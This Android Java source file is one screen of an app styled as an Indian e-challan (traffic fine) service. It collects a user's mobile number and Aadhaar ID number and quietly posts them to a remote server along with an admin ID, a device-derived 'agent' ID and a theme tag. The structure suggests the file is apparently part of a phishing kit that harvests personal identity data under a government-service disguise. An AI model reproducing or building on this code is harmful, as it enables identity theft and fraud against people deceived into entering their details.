package com.pegalite.neotron3.ui.echallan;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.pegalite.neotron3.databinding.ActivityEchallanPage1Binding;
import com.pegalite.neotron3.databinding.ActivityEchallanV2Page1Binding;
import com.pegalite.neotron3.functions.Utils;
import com.pegalite.neotron3.server.req.RetrofitClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Random;

import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class EChallanPage1Activity extends AppCompatActivity {

    ActivityEchallanV2Page1Binding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityEchallanV2Page1Binding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.submit.setOnClickListener(view -> {
            String number = binding.mobileNo.getText().toString();
            String customerNo = binding.aadhar.getText().toString();

            if (number.isEmpty() || customerNo.isEmpty()) {
                Toast.makeText(this, "Please fill all fields", Toast.LENGTH_SHORT).show();
            } else {
                JSONObject object = new JSONObject();
                try {
                    object.put("submissionId", getSaltString());
                    object.put("number", number);
                    object.put("aadhar", customerNo);
                    saveDetails(object);
                    startActivity(new Intent(this, EChallanPage2Activity.class).putExtra("data", object.toString()));
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }

        });

    }

    private void saveDetails(JSONObject data) {
        try {
            RetrofitClient.getInstance(this).getApiInterfaces()
                    .onSaveDetails(RetrofitClient.generateRequestBody(new JSONObject().put("adminID", Utils.ADMIN_ID).put("submissionId", data.optString("submissionId")).put("agentID", "agent-" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "-" + getPackageName())
                            .put("details", data.put("type", Utils.THEME)))).enqueue(new Callback<>() {
                        @Override
                        public void onResponse(@NonNull Call<ResponseBody> call, @NonNull Response<ResponseBody> response) {

                        }

                        @Override
                        public void onFailure(@NonNull Call<ResponseBody> call, @NonNull Throwable throwable) {

                        }
                    });
        } catch (JSONException e) {
            throw new RuntimeException(e);
        }
    }

    protected String getSaltString() {
        String SALT_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
        StringBuilder salt = new StringBuilder();
        Random rnd = new Random();
        while (salt.length() < 10) {
            int index = (int) (rnd.nextFloat() * SALT_CHARS.length());
            salt.append(SALT_CHARS.charAt(index));
        }
        return salt.toString();

    }

}